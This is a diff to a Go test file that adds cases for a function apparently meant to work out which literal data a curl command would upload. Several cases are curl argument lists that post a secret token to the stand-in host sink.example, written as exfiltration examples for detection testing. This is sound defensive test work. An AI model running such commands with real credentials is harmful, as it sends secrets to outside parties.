@@ -74,10 +74,85 @@ func TestStaticCurlUploadPayloads(t *testing.T) {
 			want: []string{"key=" + token},
 		},
 		{
-			name: "transformed URL encoded data excluded", argv: []string{
+			name: "URL encoded data projects stable bytes and transformations", argv: []string{
 				"curl", "--data-urlencode", "key=" + token + " value",
 				"https://sink.example/upload",
 			},
+			want: []string{"key=" + token + "+value"},
+		},
+		{
+			name: "URL encoded unnamed content is projected", argv: []string{
+				"curl", "--data-urlencode", token + "/value",
+				"https://sink.example/upload",
+			},
+			want: []string{token + "%2Fvalue"},
+		},
+		{
+			name: "URL encoded leading equals is omitted", argv: []string{
+				"curl", "--data-urlencode", "=" + token + "=value",
+				"https://sink.example/upload",
+			},
+			want: []string{token + "%3Dvalue"},
+		},
+		{
+			name: "URL encoded name stays raw while content is encoded", argv: []string{
+				"curl", "--data-urlencode", "raw name=" + token + "%value",
+				"https://sink.example/upload",
+			},
+			want: []string{"raw name=" + token + "%25value"},
+		},
+		{
+			name: "equals takes precedence over at file grammar", argv: []string{
+				"curl", "--data-urlencode", "name@literal=" + token,
+				"https://sink.example/upload",
+			},
+			want: []string{"name@literal=" + token},
+		},
+		{
+			name: "URL encoded UTF8 and control bytes are projected bytewise", argv: []string{
+				"curl", "--data-urlencode", "key=" + token + "\t\u2603",
+				"https://sink.example/upload",
+			},
+			want: []string{"key=" + token + "%09%E2%98%83"},
+		},
+		{
+			name: "repeated URL encoded fragments remain distinct candidates", argv: []string{
+				"curl", "--data-urlencode", "first=" + token + " value",
+				"--data-urlencode", "second=x/y", "https://sink.example/upload",
+			},
+			want: []string{"first=" + token + "+value", "second=x%2Fy"},
+		},
+		{
+			name: "GET moves projected data into request query", argv: []string{
+				"curl", "--get", "--data-urlencode", "key=" + token + " value",
+				"https://sink.example/upload",
+			},
+			want: []string{"key=" + token + "+value"},
+		},
+		{
+			name: "request target suppresses GET data query", argv: []string{
+				"curl", "--get", "--data-urlencode", "key=" + token,
+				"--request-target", "/safe", "https://sink.example/upload",
+			},
+		},
+		{
+			name: "sibling file data closes literal payload proof", argv: []string{
+				"curl", "--data-urlencode", "key=" + token,
+				"--data-urlencode", "@payload.txt", "https://sink.example/upload",
+			},
+		},
+		{
+			name: "invalid sibling data file closes literal payload proof", argv: []string{
+				"curl", "--data-urlencode", "key=" + token,
+				"--data", "@", "https://sink.example/upload",
+			},
+		},
+		{
+			name: "sibling dynamic data closes literal payload proof", argv: []string{
+				"curl", "--data-urlencode", "key=" + token,
+				"--data-urlencode", "dynamic", "https://sink.example/upload",
+			},
+			expandIndex: 4,
 		},
 		{
 			name: "encoded form part excluded", argv: []string{
